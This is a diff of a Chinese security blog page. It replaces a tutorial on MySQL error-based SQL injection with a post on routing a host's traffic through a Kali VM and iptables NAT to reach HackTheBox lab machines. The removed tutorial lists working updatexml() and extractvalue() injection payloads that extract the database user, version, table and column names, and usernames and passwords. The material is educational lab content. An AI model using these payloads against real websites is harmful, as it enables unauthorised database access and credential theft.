@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>sql注入之报错注入 |  小张之栈</title>
+      <title>路由转发实操 |  小张之栈</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -64,7 +64,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-sql注入之报错注入"
+  id="post-lyzfsc"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -76,7 +76,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  sql注入之报错注入
+  路由转发实操
 </h1>
  
 
@@ -84,11 +84,11 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" class="article-date">
-  <time datetime="2023-05-20T02:11:37.000Z" itemprop="datePublished">2023-05-20</time>
+      <a href="/2024/02/16/lyzfsc/" class="article-date">
+  <time datetime="2024-02-16T15:29:20.000Z" itemprop="datePublished">2024-02-16</time>
 </a> 
   <div class="article-category">
-    <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/">web漏洞</a> / <a class="article-category-link" href="/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+    <a class="article-category-link" href="/categories/%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91/">路由转发</a>
   </div>
   
 <div class="word_count">
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">446</span>
+            <span class="post-count">985</span>
         </span>
     </span>
 
@@ -105,7 +105,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2 分钟</span>
+            <span class="post-count">3 分钟</span>
         </span>
     </span>
 </div>
@@ -120,21 +120,53 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
-<p><strong>extravtvalue()</strong></p>
-<p>floor()、rand()…主键重复方式，暂时不展开</p>
-<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+  <h1 id="0x01-实操原因"><a href="#0x01-实操原因" class="headerlink" title="0x01 实操原因"></a>0x01 实操原因</h1><p>玩htb的时候，kali实在不能再多进程啦，开个bp都卡死，之前我不是想着由物理机去开burpsuite，解放kali嘛，但是失败了，当时burp是抓到了虚拟机里访问目标web的包，但是它作为一个代理，源ip(burp)与目的ip(htb)不在同网段，遗憾放弃；但现在不一样了，我是真的花时间去想这个东西，还真让我找到了</p>
+<h1 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h1><p>三个机子，主机为A，虚拟机kali为B，hackthebox为C</p>
+<p>我可以直接给物理机下一个openvpn，但我懒</p>
+<p>已知B通过openvpn能访问C；而我A和B属于另一网段，可互相访问；现在B容易卡死，因为主机太垃圾，虚拟机空间不够，所以我想尝试A通过B访问C，这种思路分析一下，那就是个代理技术，B作为代理服务器，感觉有搞头嘞</p>
+<p>但是貌似有更直接的方法，即<strong>路由转发</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">window下：</span><br><span class="line">route add 10.0.0.0 mask 255.0.0.0 192.168.241.3 <span class="comment">#流向C的流量，发往kali</span></span><br><span class="line"><span class="comment">#其实是下面这种</span></span><br><span class="line"><span class="comment">#第一条规则告诉主机A，当它试图访问 10.10.11.249 时，数据包应该通过路由到 10.10.16.9(B使用openvpn时分配的ip)。</span></span><br><span class="line">route add 10.10.16.9 mask 255.255.255.255 192.168.241.3(B的ip)</span><br><span class="line"><span class="comment">#第二条规则告诉主机A，当它试图访问 10.10.16.9 时，数据包应该通过路由到 192.168.241.3。</span></span><br><span class="line">route add 10.10.11.249 mask 255.255.255.255 10.10.16.9</span><br><span class="line"></span><br><span class="line">kali下：</span><br><span class="line">sudo sysctl -w net.ipv4.ip_forward=1</span><br><span class="line">iptables -t nat -A POSTROUTING -o &lt;OpenVPN接口&gt; -j MASQUERADE <span class="comment">#接口比如tun0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面这几个缺一不可</span></span><br><span class="line"><span class="comment">#将从物理机A到虚拟机B (Kali) 的流量的源IP地址修改为虚拟机B (Kali) 的IP地址，并且确保相关的转发规则</span></span><br><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE</span></span><br><span class="line">iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line"></span><br><span class="line">iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#iptables -t nat -L -n -v #查看配置的</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串</p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
+<ul>
+<li><p><code>-t nat</code>: 指定规则表为 “nat” 表，即网络地址转换表。</p>
+</li>
+<li><p><code>-A POSTROUTING</code>: 在 “nat” 表的 POSTROUTING 链中追加规则，即对于从本地网络流出的数据包进行处理。</p>
+</li>
+<li><p><code>-o tun0</code>: 指定出口接口为 <code>tun0</code>，即数据包将通过这个接口离开本地网络。</p>
+</li>
+<li><p><code>-j MASQUERADE</code>: 使用 <code>MASQUERADE</code> 目标，将数据包的源地址替换为本地网络接口的地址，使其看起来像是从主机直接流出的</p>
+<p>为通过 <code>tun0</code> 接口流出的数据包进行地址伪装，使得它们看起来像是直接从主机发出的。这通常用于隐藏内部网络结构</p>
+</li>
+</ul>
 </blockquote>
-<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></pre></td></tr></table></figure>
 
-<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>-A FORWARD: 在 “filter” 表的 FORWARD 链中追加规则，即用于处理转发的数据包</p>
+<p>-i tun0 -o eth0: 数据包从 tun0 接口进入，经过 eth0 接口流出。</p>
+<p>-m state –state RELATED,ESTABLISHED: 匹配已建立连接或与已建立连接相关的数据包。</p>
+<p>-j ACCEPT: 允许匹配的数据包通过</p>
+<p>#↑允许已建立连接或相关的数据包在 tun0 和 eth0 之间进行转发</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT</span><br></pre></td></tr></table></figure>
 
+<blockquote>
+<ul>
+<li><code>-A FORWARD</code>: 在 “filter” 表的 FORWARD 链中追加规则。</li>
+<li><code>-i eth0 -o tun0</code>: 数据包从 <code>eth0</code> 接口进入，经过 <code>tun0</code> 接口流出。</li>
+<li><code>-j ACCEPT</code>: 允许所有匹配的数据包通过。</li>
+</ul>
+<p>这条规则的作用是允许所有从 <code>eth0</code> 到 <code>tun0</code> 的数据包进行转发。</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20240216171240079.png" alt="物理机ping成功"></p>
+<p>可行，这种方式解决了虚拟机内存不够的问题，进程多了容易卡死，这个应该就可以用我物理机的burp去抓包了</p>
+<p>总结一下，windows机去添加两条路由，告诉数据包应该怎么走；kali做ip转发，以及源ip转换</p>
+<p>参考来源：<strong>chatgpt 3.5</strong> (啧，折腾好久)</p>
  
       <!-- reward -->
       
@@ -199,12 +231,12 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/02/16/lyzfsc/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E8%BD%AC%E5%8F%91/" rel="tag">流量转发</a></li></ul>
 
     </footer>
   </div>
@@ -212,19 +244,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/05/20/python%E4%B8%8E%E6%B8%97%E9%80%8F/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            python与渗透
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/05/20/sqli-labs/" class="article-nav-link">
+      <a href="/2024/02/02/%E6%90%AD%E5%BB%BA-ssrf/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">sqli-labs</div>
+        <div class="article-nav-title">内网场景搭建</div>
       </a>
     
   </nav>
